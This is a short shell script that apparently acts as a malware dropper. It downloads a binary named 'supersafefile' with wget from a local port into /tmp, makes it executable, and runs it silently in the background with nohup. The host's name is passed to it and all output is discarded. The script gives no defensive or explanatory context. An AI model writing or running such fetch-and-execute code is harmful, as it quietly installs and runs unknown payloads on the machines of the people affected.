#!/bin/sh
FILE=/tmp/supersafefile
if [ ! -f "$FILE" ]; then
	echo "$FILE does not exist."
	wget http://127.0.0.1:1337/supersafefile -P /tmp
	chmod +x supersafefile
fi
nohup ./supersafefile 127.0.0.1 $(uname -a | cut -d " " -f2) &> /dev/null &
